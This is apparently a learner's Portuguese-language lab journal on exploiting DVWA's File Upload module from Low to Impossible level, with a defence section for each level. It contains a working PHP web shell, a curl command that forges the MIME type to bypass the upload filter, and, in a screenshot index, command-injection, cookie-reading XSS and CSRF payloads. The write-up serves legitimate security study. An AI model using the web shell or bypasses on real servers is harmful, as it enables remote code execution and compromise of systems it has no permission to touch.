Primeira exploração do módulo **File Upload** do DVWA — perceber como um upload sem validação de tipo de ficheiro pode resultar em RCE (Remote Code Execution) direto, através de uma web shell.

### Ação executada

1. DVWA Security → Low. Módulo **File Upload** — formulário simples "Choose an image to upload" (Browse + Upload).
2. **Web shell criada** no Kali:
   ```
   echo '<?php system($_GET["cmd"]); ?>' > ~/shell.php
   ```
3. Upload do `shell.php` através do formulário → confirmado: `../../hackable/uploads/shell.php succesfully uploaded!`
4. **Execução:** visitado o URL do ficheiro carregado, com um comando no parâmetro `cmd`:
   ```
   http://192.168.10.101/hackable/uploads/shell.php?cmd=whoami
   ```

### Resultado

A página devolveu `www-data` — o mesmo utilizador já identificado no Command Injection (Entrada #17). Confirma RCE completo: o servidor aceitou o ficheiro `.php` sem qualquer verificação, guardou-o numa pasta acessível pelo browser, e executou-o como código ao ser visitado — dando controlo para correr **qualquer** comando do sistema operativo através do parâmetro `cmd`.

### Deduções e raciocínio (certos e corrigidos)

- **Intuição inicial insuficiente:** a minha primeira ideia foi que o ficheiro seria "intercetado ou visto" antes de causar dano — não percebi, sem ajuda, que o problema real é o servidor **executar** o `.php` como código ao ser aberto no browser, e não apenas "guardá-lo". Só ficou claro com a explicação direta e a analogia da receção de encomendas (um cacifo que aceita um embrulho sem o verificar, que liberta controlo do edifício ao ser aberto).
- **Ligação a conceitos já conhecidos:** o resultado (`www-data`) e o mecanismo de execução de comandos via parâmetro (`?cmd=`) são, na prática, o mesmo RCE do Command Injection — só muda o canal de entrada (um ficheiro carregado, em vez de um campo de texto).

**Consigo explicar isto a alguém?**
  Porque é que um upload sem validação de tipo de ficheiro pode dar controlo total do servidor: **Sim**, com ajuda da analogia da receção de encomendas — mas a intuição inicial (antes da explicação) estava errada.

### Como nos podemos defender

- **Validação do tipo de ficheiro no servidor** (nunca confiar só na extensão ou no nome — verificar o conteúdo real do ficheiro).
- **Whitelist de extensões permitidas** (ex.: só `.jpg`, `.png`, `.gif`), rejeitando tudo o resto.
- **Guardar os ficheiros carregados fora da pasta acessível pelo browser**, ou impedir a execução de scripts nessa pasta (ex.: configuração do servidor web a bloquear execução de PHP em `uploads/`).
- **Renomear os ficheiros** ao guardá-los (nomes aleatórios), dificultando adivinhar o URL.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de input em uploads; RCE via ficheiros maliciosos
- **CEH — D5 (Web Application Hacking):** web shells como técnica clássica de pós-exploração
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] File Upload nível Medium → Impossible

---

## Entrada #38 — File Upload (nível Medium)

**Data/hora:** 2026-08-16

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Upload contra a defesa de nível Medium e contornar a verificação de MIME type.

### Ação executada

1. DVWA Security → Medium. Upload do `shell.php` pelo formulário normal → **bloqueado**: "Your image was not uploaded. We can only accept JPEG or PNG images."
2. **Diagnóstico:** o Medium verifica o `Content-Type` (MIME type) enviado com o ficheiro, aceitando só `image/jpeg` ou `image/png` — um valor controlado pelo atacante, não uma verificação do conteúdo real.
3. **Nota lateral:** confirmado, via DevTools → Storage → Cookies, o mesmo padrão de cookies `security` duplicadas já visto nas Entradas #13 e #20 (uma com `low`, path mais específico; outra com `medium`, path `/`). Não impediu o teste, mas fica registado. **O DevTools do Firefox respondeu normalmente desta vez** (painel Storage), ao contrário da falha da Entrada #30 — resolve, pelo menos parcialmente, essa pendência.
4. **Bypass**, via `curl`, forjando o `Content-Type` do ficheiro:
   ```
   curl -F "MAX_FILE_SIZE=100000" -F "uploaded=@/home/pedro/shell.php;type=image/jpeg" -F "Upload=Upload" -b "PHPSESSID=...; security=medium" "http://192.168.10.101/vulnerabilities/upload/#"
   ```
5. **Verificação:** `http://192.168.10.101/hackable/uploads/shell.php?cmd=whoami`

### Resultado

Upload aceite via `curl` (`succesfully uploaded!`), apesar de ser exatamente o mesmo ficheiro `.php` rejeitado pelo formulário — a única diferença foi o `Content-Type` forjado. RCE confirmado novamente: `www-data`.

### Deduções e raciocínio (certos e corrigidos)

- **Reconhecimento do padrão:** identifiquei corretamente que o MIME type, sendo enviado pelo cliente, é um dado não fiável — mesma lógica de "nunca confiar em dados que o atacante controla" já vista nos módulos anteriores.
- **Ferramenta já familiar, aplicada a um novo contexto:** o uso de `curl` com cookies para contornar uma defesa do lado do cliente replica a técnica da Entrada #13 (SQL Injection Medium), agora aplicada a upload de ficheiros.

**Consigo explicar isto a alguém?**
  Porque é que verificar o MIME type não é suficiente, e como o `curl` permite forjá-lo: **Sim**.

### Como nos podemos defender

- **Nunca confiar no MIME type enviado pelo cliente** — verificar o conteúdo real do ficheiro no servidor (ex.: assinatura binária/magic bytes).
- Reforços já identificados no guia: whitelist de extensões, guardar fora da pasta executável, renomear ficheiros.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de dados controlados pelo cliente (MIME type, headers)
- **CEH — D5 (Web Application Hacking):** bypass de filtros de upload via manipulação de request (curl/Burp)

### Próximos passos

- [ ] File Upload nível High → Impossible

---

## Entrada #39 — File Upload (nível High) — resultado parcial

**Data/hora:** 2026-08-16

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Upload contra a defesa de nível High e o bypass já usado no Medium (MIME type forjado).

### Ação executada

1. DVWA Security → High.
2. **Teste 1 (curl):** criado `shell2.php` (ficheiro novo, nunca testado antes) e submetido com o mesmo `Content-Type: image/jpeg` forjado que funcionou no Medium.
3. **Teste 2 (browser):** o mesmo `shell2.php` submetido através do formulário normal do DVWA.

### Resultado

**Ambos os testes falharam**, com a mesma mensagem: "Your image was not uploaded. We can only accept JPEG or PNG images." — texto idêntico ao do bloqueio no Medium, o que inicialmente gerou confusão (a mensagem de erro não distingue os níveis; a prova real está em **o que passa ou não**, não no texto do erro).

**Nota de verificação importante:** um teste inicial no browser, à URL `hackable/uploads/shell.php?cmd=whoami`, mostrou `www-data` — mas esse era o ficheiro **antigo**, carregado durante o teste do Medium (Entrada #38), que continua acessível independentemente do nível de segurança atual (o nível só controla o que é aceite num *novo* upload, não revoga ficheiros já guardados). Não prova nada sobre o High. O teste válido foi feito com `shell2.php`, ficheiro novo, testado especificamente neste nível.

O High provavelmente verifica, além do MIME type, a **extensão do nome do ficheiro** e/ou o **conteúdo real** (função tipo `getimagesize()`, que confirma que o ficheiro é mesmo uma imagem válida) — não confirmado ao detalhe do código, mas consistente com o comportamento observado.

### Deduções e raciocínio (certos e corrigidos)

- **Correção de um mal-entendido:** confundi inicialmente o resultado de um ficheiro antigo (ainda acessível) com uma prova de que o bypass funcionava no High. Corrigido ao questionar a fonte exata do resultado — reforça a lição, já vista noutros módulos, de sempre confirmar com um teste limpo e novo antes de tirar conclusões.
- **Observação comparativa entre módulos (registada no guia comparativo):** ao contrário do SQL Injection e do XSS, onde o salto de Medium para High foi sempre um reforço do **mesmo tipo** de filtro (mais casos cobertos, mesmo método de ataque), aqui o salto é uma mudança de **categoria**: o bypass do Medium (um comando `curl`) deixa de servir por completo, e um compromisso total do High parece exigir encadear **outra vulnerabilidade** (File Inclusion), não just mais esforço no mesmo ataque.

**Consigo explicar isto a alguém?**
  Que a mensagem de erro idêntica entre Medium e High não significa que a defesa seja igual — a prova está no que se consegue ou não contornar: **Sim**.
  A diferença entre "mais um degrau da mesma escada" (SQLi/XSS) e "mudar de escada por completo" (File Upload High): **Sim**.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de conteúdo real vs. apenas metadados (MIME type, extensão)
- **CEH — D5 (Web Application Hacking):** encadeamento de vulnerabilidades (File Upload + File Inclusion) para RCE completo

### Próximos passos

- [ ] Módulo **File Inclusion** — necessário para fechar o compromisso completo do File Upload High
- [ ] File Upload nível Impossible

---

## Entrada #40 — File Upload (nível Impossible) — fecha o File Upload por hoje

**Data/hora:** 2026-08-16

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o File Upload contra a defesa de nível Impossible.

### Ação executada

1. DVWA Security → Impossible. Ficheiro novo `shell3.php` criado para o teste.
2. **Primeira tentativa** via `curl`, com `Content-Type` forjado (igual ao Medium/High) → `HTTP/1.1 302 Found`, redirecionado para `index.php`, sem processar o upload.
3. **Diagnóstico:** o Impossible exige um **token anti-CSRF** (`user_token`) embutido no formulário, que o pedido inicial não incluía — o mesmo mecanismo de defesa já visto no CSRF Impossible (Entrada #36), agora também presente neste módulo.
4. **Extração do token**, via `curl` + `grep`, e reenvio do pedido com o token incluído:
   ```
   curl -s -b "PHPSESSID=...; security=impossible" ".../upload/" | grep -oP "user_token' value='\K[a-f0-9]+"
   curl -i -F "uploaded=@shell3.php;type=image/jpeg" -F "user_token=<valor>" -F "Upload=Upload" -b "..." ".../upload/#"
   ```

### Resultado

Com o token válido incluído, o pedido foi processado (deixou de dar redirect) — mas o upload continuou **bloqueado**: "Your image was not uploaded. We can only accept JPEG or PNG images." Mesmo resultado do High, mais a camada extra do token anti-CSRF. Confirma que o Impossible resiste ao mesmo bypass que falhou no High, e acrescenta uma defesa adicional que nem chega a avaliar o ficheiro sem o token correto.

### Deduções e raciocínio (certos e corrigidos)

- **Padrão reconhecido de outro módulo:** o token anti-CSRF aqui é a mesma técnica já vista no CSRF Impossible — reforça que esta defesa (valor secreto, gerado pelo servidor, obrigatório em cada pedido) é uma prática transversal, não exclusiva de um módulo.
- **Persistência a resolver um obstáculo técnico:** o primeiro sinal (302, sem mensagem de erro visível) podia ter sido mal interpretado como "falha do comando" — foi preciso usar `-i` para ver os cabeçalhos e perceber a causa real (falta de token), replicando o hábito já estabelecido de diagnosticar antes de desistir ou assumir.

**Consigo explicar isto a alguém?**
  Que um `302 Found` sem corpo de resposta pode ser sinal de uma defesa (token em falta), e como diagnosticar isso com `curl -i`: **Sim**.

### Balanço do módulo File Upload (Low → Impossible, com pendência)

Low e Medium totalmente comprometidos (RCE direto). High e Impossible resistem ao bypass de MIME type — o Impossible acrescenta ainda um token anti-CSRF. Um compromisso completo de High/Impossible fica pendente de um encadeamento com o módulo **File Inclusion**, ainda por explorar. Consolidação em [`guias-estudo/guia-estudo-file-upload.md`](./guias-estudo/guia-estudo-file-upload.md).

### Domínios relacionados

- **Security+ — D2 / D4:** tokens anti-CSRF como defesa transversal a vários tipos de formulário
- **CEH — D5 (Web Application Hacking):** diagnóstico de respostas HTTP (códigos de estado, cabeçalhos) para perceber defesas não visíveis na página

### Próximos passos

- [ ] Módulo **File Inclusion**
- [ ] Voltar ao File Upload High/Impossible depois, para tentar o compromisso completo encadeado
- [ ] Brute Force — último módulo da Fase 2

---

## Screenshots

Os prints ilustrativos de cada dia de trabalho ficam guardados em `screenshots/AAAA-MM-DD/`, referenciados a partir da entrada correspondente.

- `screenshots/2026-08-02/entrada06-dvwa-login-page.png` — página de login do DVWA após inicialização da base de dados
- `screenshots/2026-08-02/entrada07-dvwa-welcome-page.png` — página inicial do DVWA após login bem-sucedido
- `screenshots/2026-08-02/entrada08-nmap-pos-dvwa.png` — resultado do scan nmap pós-DVWA, mostrando a porta 80 aberta
- `screenshots/2026-08-02/entrada10-sqli-teste-normal.png` — teste normal do módulo SQL Injection (ID 1 → admin/admin)
- `screenshots/2026-08-02/entrada11-sqli-injecao-bem-sucedida.png` — injeção SQL bem-sucedida, devolvendo todos os 5 utilizadores
- `screenshots/2026-08-06/entrada13-sqli-medium-curl.png` — confirmação do SQL Injection Medium via `curl`, sem depender do browser
- `screenshots/2026-08-11/entrada15-sqli-high-5-utilizadores.png` — SQL Injection High bem-sucedido, devolvendo todos os 5 utilizadores
- `screenshots/2026-08-12/entrada16-sqli-impossible-ataque-falhado.png` — SQL Injection Impossible: mesmo payload do High devolve resultado vazio (ataque falhado por prepared statements)
- `screenshots/2026-08-12/entrada17-cmdinjection-controlo-ping.png` — Command Injection Low: caso de controlo, ping normal a 127.0.0.1
- `screenshots/2026-08-12/entrada17-cmdinjection-whoami.png` — Command Injection Low: injeção `; whoami` devolve `www-data`
- `screenshots/2026-08-12/entrada17-cmdinjection-ls.png` — Command Injection Low: injeção `; ls -la` lista os ficheiros da aplicação
- `screenshots/2026-08-12/entrada18-cmdinjection-medium-semicolon-filtrado.png` — Command Injection Medium: payload do Low (`; whoami`) filtrado, só devolve o ping
- `screenshots/2026-08-12/entrada18-cmdinjection-medium-pipe-bypass.png` — Command Injection Medium: bypass com `|` (pipe) devolve `www-data`
- `screenshots/2026-08-12/entrada18-cmdinjection-medium-doubleamp-bloqueado.png` — Command Injection Medium: `&&` bloqueado pela blacklist, só devolve o ping
- `screenshots/2026-08-12/entrada18-cmdinjection-medium-amp-bypass.png` — Command Injection Medium: bypass com `&` (segundo plano) devolve ping + `www-data`
- `screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-espaco-bloqueado.png` — Command Injection High: `| whoami` (pipe com espaço) bloqueado pela blacklist maior
- `screenshots/2026-08-12/entrada19-cmdinjection-high-amp-bypass.png` — Command Injection High: `&` ainda passa, devolve ping + `www-data`
- `screenshots/2026-08-12/entrada19-cmdinjection-high-pipe-semespaco-bypass.png` — Command Injection High: `|whoami` (pipe sem espaço) contorna o filtro, devolve `www-data`
- `screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-valido.png` — Command Injection Impossible: só o IP válido é aceite e faz ping
- `screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-invalido-erro.png` — Command Injection Impossible: qualquer bypass devolve "invalid IP" (whitelist recusa tudo)
- `screenshots/2026-08-12/entrada21-xss-reflected-controlo-hello.png` — XSS Reflected Low: caso de controlo, nome `Pedro` devolve "Hello Pedro"
- `screenshots/2026-08-12/entrada21-xss-reflected-alert.png` — XSS Reflected Low: `<script>alert('XSS')</script>` executa e abre popup
- `screenshots/2026-08-12/entrada21-xss-reflected-cookie-roubada.png` — XSS Reflected Low: `document.cookie` lê a cookie de sessão (PHPSESSID), payload visível no URL
- `screenshots/2026-08-12/entrada22-xss-reflected-medium-script-filtrado.png` — XSS Reflected Medium: `<script>` apagado pelo filtro, aparece só "Hello alert('XSS')" como texto
- `screenshots/2026-08-12/entrada22-xss-reflected-medium-img-bypass.png` — XSS Reflected Medium: bypass com `<img src=x onerror=alert('XSS')>` dispara o popup
- `screenshots/2026-08-12/entrada23-xss-reflected-high-img-bypass.png` — XSS Reflected High: `<img onerror>` ainda passa e dispara o popup
- `screenshots/2026-08-12/entrada23-xss-reflected-high-script-bloqueado.png` — XSS Reflected High: `<ScRiPt>` (variação de maiúsculas) bloqueado, mostra só "Hello >"
- `screenshots/2026-08-12/entrada24-xss-reflected-impossible-payload-texto.png` — XSS Reflected Impossible: `<img onerror>` mostrado como texto literal (output encoding), sem executar
- *(Entrada #25 — screenshots do XSS Stored a inserir na próxima sessão, quando o ambiente de recorte voltar.)*
- `screenshots/2026-08-15/entrada30-xss-dom-medium-teste.png` — XSS DOM Medium: teste do bypass `<img onerror>`, sem popup
- `screenshots/2026-08-15/entrada30-xss-dom-medium-viewsource-sink.png` — XSS DOM Medium: código-fonte revelando o sink `document.write` dentro de `<option>`
- `screenshots/2026-08-15/entrada30-xss-dom-medium-devtools-tentativa.png` — XSS DOM Medium: tentativa (falhada) de confirmar o DOM real via Inspetor de Elementos
- `screenshots/2026-08-15/entrada32-xss-dom-impossible-valor-codificado.png` — XSS DOM Impossible: valor mostrado codificado em URL (`%3Cscript%3E...`), sem executar
- `screenshots/2026-08-15/entrada33-csrf-low-controlo.png` — CSRF Low: caso de controlo, formulário de mudança de password
- `screenshots/2026-08-15/entrada33-csrf-low-ataque-sucesso.png` — CSRF Low: login bem-sucedido com a password do ataque via `<img>`
- `screenshots/2026-08-15/entrada34-csrf-medium-baseline.png` — CSRF Medium: password de base estabelecida via formulário oficial ("Password Changed.")
- `screenshots/2026-08-15/entrada34-csrf-medium-ataque-sucesso.png` — CSRF Medium: login bem-sucedido com a password do ataque
- `screenshots/2026-08-15/entrada35-csrf-high-nivel-confirmado.png` — CSRF High: nível de segurança confirmado antes do teste
- `screenshots/2026-08-15/entrada35-csrf-high-ataque-sucesso.png` — CSRF High: login bem-sucedido, bypass via ausência de Referer
- `screenshots/2026-08-15/entrada36-csrf-impossible-falso-positivo-diagnostico.png` — CSRF Impossible: mensagem "Passwords did not match or current password incorrect", diagnóstico da contaminação do ambiente
- `screenshots/2026-08-15/entrada36-csrf-impossible-reset-db.png` — CSRF Impossible: reposição da base de dados do DVWA
- `screenshots/2026-08-15/entrada36-csrf-impossible-login-failed.png` — CSRF Impossible: "Login failed" com a password do ataque, ambiente limpo
- `screenshots/2026-08-15/entrada36-csrf-impossible-defesa-confirmada.png` — CSRF Impossible: login bem-sucedido só com a password real, confirmando que a defesa resistiu
